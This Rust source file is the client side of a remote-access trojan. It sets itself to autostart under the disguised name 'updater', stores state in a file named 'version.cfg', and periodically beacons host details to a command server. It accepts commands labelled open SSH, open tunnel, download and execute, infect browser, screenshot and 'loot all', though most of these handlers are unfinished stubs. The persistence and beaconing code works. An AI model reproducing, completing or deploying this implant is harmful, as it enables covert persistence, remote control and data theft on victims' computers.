use core::str;
use std::{env, net::Ipv4Addr, str::FromStr};
use auto_launch::AutoLaunchBuilder;
use local_ip_address::local_ip;
use reqwest::{blocking::Response, Error};
use serde::{Deserialize, Serialize};
use whoami::{fallible::{distro, hostname}, platform};
use std::{thread, time};
use rand::Rng;
use serde_json::json;

#[derive(Deserialize)]
struct Command {
    prev: i64,
    nonce: i64,
    command: String,
    signature: String,
}

#[derive(Deserialize)]
struct UpdateResponse {
    success: bool,
    token: String,
    uid: String,
    pub_key: String,
}

#[derive(Serialize)]
pub struct Log {
    uid: String,
    key: String,
    value: String,
}

fn main() {
    let path = env::current_exe()
                        .unwrap()
                        .as_path()
                        .to_str()
                        .unwrap()
                        .to_owned();

    let auto = AutoLaunchBuilder::new()
        .set_app_name("updater")
        .set_app_path(&path)
        .set_use_launch_agent(true)
        .set_args(&["--minimized"])
        .build()
        .unwrap();

    // enable the autostart:
    if !auto.is_enabled().unwrap() {
        if auto.enable().is_ok() {
            // autostart was enabled
        }
    }

    let url_base = "http://localhost:3000";

    let db: sled::Db = sled::open("version.cfg").unwrap();
    
    // restore stored values:
    let user_id_db = db.get(b"user_id");
    let access_token_db = db.get(b"access_token");
    let pub_key_db = db.get(b"pub_key");
    let previous_db = db.get(b"previous");

    let mut user_id: Option<String> = match user_id_db {
        Ok(x) => {
            match x {
                Some(y) => {
                    Some(str::from_utf8(&y).unwrap().to_owned())
                },
                None => {
                    Option::None
                },
            }
        },
        Err(_) => {
            Option::None
        },
    };

    let mut access_token: Option<String> = match access_token_db {
        Ok(x) => {
            match x {
                Some(y) => {
                    Some(str::from_utf8(&y).unwrap().to_owned())
                },
                None => {
                    Option::None
                },
            }
        },
        Err(_) => {
            Option::None
        },
    };

    let mut pub_key: Option<String> = match pub_key_db {
        Ok(x) => {
            match x {
                Some(y) => {
                    Some(str::from_utf8(&y).unwrap().to_owned())
                },
                None => {
                    Option::None
                },
            }
        },
        Err(_) => {
            Option::None
        },
    };

    let mut previous: i64 = match previous_db {
        Ok(x) => {
            match x {
                Some(y) => {
                    let str_data = str::from_utf8(&y).unwrap();
                    i64::from_str(str_data).unwrap()
                },
                None => {
                    0
                },
            }
        },
        Err(_) => {
            0
        },
    };

    loop {
        let internal_ip = local_ip().unwrap_or(std::net::IpAddr::V4(Ipv4Addr::from_str("127.0.0.1").unwrap())).to_string();
        let external_ip = "";
        let hostname = hostname().unwrap_or("UNKNOWN".to_owned());
        let operating_system = format!("{} - {}", platform(), distro().unwrap_or("UNKNOWN".to_owned()));
        
        // wait
        let sleep_secs = rand::thread_rng().gen_range(100..1000);
        let wait_time = time::Duration::from_secs(sleep_secs);

        thread::sleep(wait_time);
    
        // send update
        let http_client = reqwest::blocking::Client::new();
        let json = &json!({
            "internal_ip": internal_ip,
            "external_ip": external_ip,
            "hostname": hostname,
            "operating_system": operating_system
        });

        let res: Result<Response, Error>;
        if user_id.is_none() {
            res = http_client.post(format!("{}/update", url_base))
                .json(json)
                .send();

            if res.is_err() {
                continue;
            }

            let res_data: UpdateResponse = res.unwrap().json().unwrap();

            if res_data.success {
                user_id = Some(res_data.uid);
                access_token = Some(res_data.token);
                pub_key = Some(res_data.pub_key);

                let _ = db.insert(b"user_id", user_id.clone().unwrap().as_bytes());
                let _ = db.insert(b"access_token", access_token.clone().unwrap().as_bytes());
                let _ = db.insert(b"pub_key", pub_key.clone().unwrap().as_bytes());
            } else {
                continue;
            }
        } else {
            res = http_client.post(format!("{}/update/{}", url_base, user_id.clone().unwrap()))
                .json(json)
                .bearer_auth(access_token.clone().unwrap())
                .send();

            if res.is_err() {
                continue;
            }

            // read command
            let res = res.unwrap();
            let cmd = res.json();

            if cmd.is_err() {
                continue;
            }

            let cmd: Command = cmd.unwrap();

            // verify signature and nonce
            let mut verified = true;

            if verified {
                //TODO: check signature
            }

            if verified {
                verified = cmd.prev == previous;
            }

            if !verified {
                continue;
            } else {
                previous = cmd.nonce;
                let _ = db.insert(b"previous", previous.to_string().as_bytes());
            }

            // execute command
            let cmd_payload = cmd.command;
            let mut data: Log = Log { uid: ("".to_owned()), key: ("".to_owned()), value: ("".to_owned()) };
            data.uid = user_id.clone().unwrap();

            if cmd_payload.starts_with("00") { // open ssh
                data.key = "open_ssh".to_owned();
            }
            else if cmd_payload.starts_with("01") { // close ssh
                data.key = "close_ssh".to_owned();
            }
            else if cmd_payload.starts_with("02") { // open tunnel
                data.key = "open_tunnel".to_owned();
            }
            else if cmd_payload.starts_with("03") { // close tunnel
                data.key = "close_tunnel".to_owned();
            }
            else if cmd_payload.starts_with("04") { // download and execute
                data.key = "download".to_owned();
            }
            else if cmd_payload.starts_with("05") { // infect browser
                data.key = "browser_infection".to_owned();
            }
            else if cmd_payload.starts_with("06") { // screenshot
                data.key = "screenshot".to_owned();
            }
            else if cmd_payload.starts_with("07") { // loot all
                data.key = "loot".to_owned();
            }
            else if cmd_payload.starts_with("08") { // sleep
                data.key = "sleep".to_owned();
            }
            else if cmd_payload.starts_with("09") { // uninstall
                data.key = "uninstall".to_owned();

                // disable the autostart:
                if auto.is_enabled().unwrap() {
                    if auto.disable().is_ok() {
                        data.value = "auto start disabled".to_owned();
                    } else {
                        data.value = "error disabling auto start".to_owned();
                    }
                }

                //TODO: delete the current executable based on the OS
                // - check os
                // - spawn new shell process
                // - sleep for x seconds
                // - rm this image path
                
                //TODO: break;
            }

            // send response log
            let _ = http_client.post(format!("{}/log", url_base))
                    .json(&json!({
                        "uid": data.uid,
                        "key": data.key,
                        "value": data.value,
                    }))
                    .bearer_auth(access_token.clone().unwrap())
                    .send();
        }
    }
}
